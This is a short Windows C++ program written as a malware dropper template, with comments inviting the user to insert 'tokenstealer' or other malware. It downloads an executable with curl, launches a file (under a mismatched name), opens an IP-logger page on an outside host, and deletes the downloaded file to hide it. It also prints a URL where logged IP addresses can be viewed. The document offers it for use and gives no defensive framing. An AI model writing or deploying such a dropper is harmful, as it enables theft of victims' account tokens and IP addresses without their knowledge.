#include "pch.h"
#include <iostream>
#include <cstdlib>
#include <windows.h>
#include <thread>
#include <chrono>
using namespace std;

int main()
{
    //tokenstealer link .exe  / or malware or what ever you want to add
    system("curl tokenstealer link here .exe >> nci.exe");
    Sleep(1000);
    //starts the software you installed with curl
    system("start software.exe");
    //Ip logger you can change that ofc to your own ip logger link
    system("start https://lizardsquad.ru/lol.php");
    Sleep(2500);
    //deletes the token logger / malware or whatever you added
    system("del nci.exe");
    //You can see the logged ips here
    std::cout << "To see the logged ips go to https://lizardsquad.ru/cook.txt/" << endl;
    Sleep(2500);
    return 0;
}
